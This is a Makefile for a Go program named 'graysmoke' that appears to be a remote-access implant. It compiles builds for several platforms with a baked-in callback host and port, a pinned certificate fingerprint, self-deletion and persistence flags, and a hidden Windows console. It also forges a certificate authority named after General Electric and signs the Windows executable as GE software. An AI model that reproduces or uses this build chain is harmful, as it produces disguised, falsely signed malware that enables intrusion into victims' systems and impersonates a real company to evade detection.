BUILD=go build
OUT_LINUX=./bin/graysmoke
OUT_WINDOWS=./bin/graysmoke.exe
SIGNED_WIN_OUT=./bin/graysmoke_signed.exe
WIN_RESOURCE=./resource.syso
SRC=.
SRV_KEY=server.key
SRV_PEM=server.pem
#Linux doesnt have a install/persistence options so INSTALL=false
LINUX_LDFLAGS=--trimpath --ldflags "-s -w -X main.connectString=${HOST}:${PORT} -X main.purge=${PURGE} -X main.delay=${DELAY} -X main.install=false -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"
#windows doesnt support windows.Unlink(file) on its self, so PURGE=false caution when using PURGE and DELAY
WIN_LDFLAGS=--trimpath --ldflags "-s -w -X main.connectString=${HOST}:${PORT} -X main.purge=false  -X main.delay=${DELAY} -X main.install=${INSTALL} -X main.fingerPrint=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui"

#To view all OS/Arch options run: go tool dist list

default: clean macos64  #clean depends macos64 

depends:
	openssl req -subj '/CN=General Electric Company CA/O=General Electric Company/C=US' -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}

linux32:
	GOOS=linux GOARCH=386 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

linux64:
	GOOS=linux GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

mips:
	GOOS=linux GOARCH=mips ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

arm:
	GOOS=linux GOARCH=arm ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

windows32:
	goversioninfo -icon=./resource/icon.ico ./resource/verioninfo.json
	GOOS=windows GOARCH=386 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS} ${SRC}
	osslsigncode sign -certs ${SRV_PEM} -key ${SRV_KEY} -n "Graysmoke" -i http://www.ge.com -in ${OUT_WINDOWS} -out ${SIGNED_WIN_OUT}
	osslsigncode verify -verbose -CAfile ${SRV_PEM} ${SIGNED_WIN_OUT}

windows64:
	goversioninfo -icon=./resource/icon.ico ./resource/verioninfo.json 
	GOOS=windows GOARCH=amd64 ${BUILD} ${WIN_LDFLAGS} -o ${OUT_WINDOWS} ${SRC} 
	osslsigncode sign -certs ${SRV_PEM} -key ${SRV_KEY} -n "Graysmoke" -i http://www.ge.com -in ${OUT_WINDOWS} -out ${SIGNED_WIN_OUT}
	osslsigncode verify -verbose -CAfile ${SRV_PEM} ${SIGNED_WIN_OUT}

macos64:
	GOOS=darwin GOARCH=amd64 ${BUILD} ${LINUX_LDFLAGS} -o ${OUT_LINUX} ${SRC}

clean:
	rm -f ${OUT_LINUX} ${OUT_WIN} ${WIN_RESOURCE} ${SIGNED_WIN_OUT} ${OUT_WINDOWS}
